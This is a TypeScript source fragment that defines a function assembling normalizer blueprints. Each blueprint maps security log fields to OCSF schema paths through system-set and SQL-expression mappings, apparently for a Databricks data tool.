// ─── Blueprint builder ──────────────────────────────────────────────────────

type BlueprintInput = {
  identifier: string
  displayName: string
  sourceParser: string
  targetGroupId: TargetGroupId
  type: "built-in" | "custom"
  latestVersion: string
  creator: "Databricks" | "You"
  source: SourceDataset
  /** OCSF target path → SQL expression. Covers every non-system field. */
  map: Record<string, string>
}

function buildBlueprint(input: BlueprintInput): NormalizerBlueprint {
  const target = TARGET_CLASSES[input.targetGroupId]
  const categoryUid = Math.floor(target.classUid / 1000)

  const systemMappings: Mapping[] = [
    {
      id: `${input.identifier}-class_uid`,
      source: String(target.classUid),
      target: "class_uid",
      expression: String(target.classUid),
      origin: "system",
    },
    {
      id: `${input.identifier}-category_uid`,
      source: String(categoryUid),
      target: "category_uid",
      expression: String(categoryUid),
      origin: "system",
    },
    {
      id: `${input.identifier}-metadata.version`,
      source: "'1.3.0'",
      target: "metadata.version",
      expression: "'1.3.0'",
      origin: "system",
    },
    {
      id: `${input.identifier}-metadata.product.name`,
      source: `'${input.sourceParser}'`,
      target: "metadata.product.name",
      expression: `'${input.sourceParser}'`,
      origin: "system",
    },
  ]

  const fieldMappings: Mapping[] = Object.entries(input.map).map(([targetPath, expression]) => ({
    id: `${input.identifier}-${targetPath}`,
    source: expression,
    target: targetPath,
    expression,
    origin: "genie",
  }))

  return {
    identifier: input.identifier,
    displayName: input.displayName,
    name: input.displayName,
    sourceParser: input.sourceParser,
    targetEventClass: `${target.name} (Class ${target.classUid})`,
    targetGroupId: input.targetGroupId,
    type: input.type,
    latestVersion: input.latestVersion,
    creator: input.creator,
    source: input.source,
    target,
    mappings: [...systemMappings, ...fieldMappings],
  }
}

